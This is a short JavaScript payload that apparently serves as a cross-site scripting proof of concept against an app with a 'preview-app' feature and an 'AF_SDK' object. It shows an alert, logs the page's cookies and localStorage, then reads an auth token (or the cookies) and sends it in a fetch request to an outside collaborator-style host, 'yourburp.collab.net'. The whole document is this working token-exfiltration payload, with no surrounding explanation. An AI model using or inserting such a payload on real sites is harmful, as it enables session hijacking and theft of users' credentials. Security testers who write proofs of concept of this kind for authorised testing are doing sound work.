
(async () => {
  alert("Script executed! ✅");

  console.log("Cookies:", document.cookie);
  console.log("localStorage:", localStorage);

  if (window.AF_SDK?.utils?.logger) {
    AF_SDK.utils.logger("Injected via preview-app payload");
  }

  const token = localStorage.getItem('authToken') || document.cookie;
  await fetch('https://yourburp.collab.net/?leak=' + encodeURIComponent(token));
})();

